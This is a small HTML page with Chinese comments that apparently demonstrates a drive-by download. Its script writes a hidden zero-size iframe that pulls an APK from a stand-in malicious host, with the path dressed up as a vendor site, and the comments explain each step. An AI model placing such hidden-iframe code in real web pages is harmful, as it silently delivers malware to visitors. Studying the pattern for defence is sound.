<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8"> <!-- 设置网页字符编码为 UTF-8 -->
</head>
<body>
  <!-- 页面主体为空 -->
</body>
<script>
  // 使用 JavaScript 的 document.write() 方法在页面中动态写入以下 HTML 内容
  document.write('<iframe src="http://www.evilsite.cn/www.vmall.com/drozer.apk" frameborder="0" width="0" height="0">');
  // 这个 <iframe> 元素被设置为隐藏（width="0" 和 height="0"），即不显示在页面上
  // src 属性指向一个恶意的 .apk 文件下载链接
</script>
</html>
